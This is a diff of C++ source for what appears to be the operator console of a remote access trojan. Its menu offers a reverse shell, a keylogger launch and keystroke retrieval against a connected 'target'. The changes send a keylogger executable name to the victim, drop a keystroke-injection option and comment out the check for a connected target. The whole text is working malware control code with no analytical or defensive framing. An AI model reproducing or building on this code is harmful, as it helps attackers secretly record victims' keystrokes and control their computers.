@@ -55,18 +55,18 @@ int main(int argc, char *argv[])
 
                 string connected_target = receive_data(sock,"target_name.rat");
 
-                if(connected_target[0] == '`')
-                {
-                    cout << ">> No targets connected!" << endl;
-                    system("pause");
-                    break;
-                }
-                else 
-                {
+                // if(connected_target[0] == '`')
+                // {
+                //     cout << ">> No targets connected!" << endl;
+                //     system("pause");
+                //     break;
+                // }
+                // else 
+                // {
                     targetconnected = true;
-                    cout << ">> Target connected: " << connected_target << endl;
+                    cout << ">> Target connected: " ;//<< connected_target << endl;
                     system("pause");
-                }
+                //}
                 break;
             }
 
@@ -102,12 +102,11 @@ int main(int argc, char *argv[])
 
                 break;
             }
-            
-            case '4':                                                                   //Execute keystroke injector
+            case '4':                                                                   //Execute keylogger
             {
                 if (targetconnected)
                 {
-                    send_data(sock,"from_server.txt", "4hello.vbs");
+                    send_data(sock,"from_server.txt", "4key_l.exe");
                     cout << ">> Sent " << endl;
                 }
                 else cout << ">> Target not connected or socket invalid!!" << endl;
@@ -116,20 +115,7 @@ int main(int argc, char *argv[])
                 break;
             }
 
-            case '5':                                                                   //Execute keylogger
-            {
-                if (targetconnected)
-                {
-                    send_data(sock,"from_server.txt", "5keylogger.exe");
-                    cout << ">> Sent " << endl;
-                }
-                else cout << ">> Target not connected or socket invalid!!" << endl;
-                system("pause");
-
-                break;
-            }
-
-            case '6':                                                                   //stop keylogger
+            case '5':                                                                   //stop keylogger
             {
                 if (targetconnected)
                 {
@@ -570,13 +556,12 @@ char Get_menu_option()
 
     cout << R"(
                                     Target Info                             2
-                                    Rev Shell                               3
-                                    KeyStroke Injection                     4
-                                    Run KeyLogger                           5
-                                    Get Keystrokes                          6
                                                                             )";            
                                     
     if(targetconnected)cout << R"(
+                                    Rev Shell                               3
+                                    Run KeyLogger                           4
+                                    Get Keystrokes                          5
                                     Make Target try again after 5 sec      [~]
                                     DC target & close                      {#}
                                                                             )";
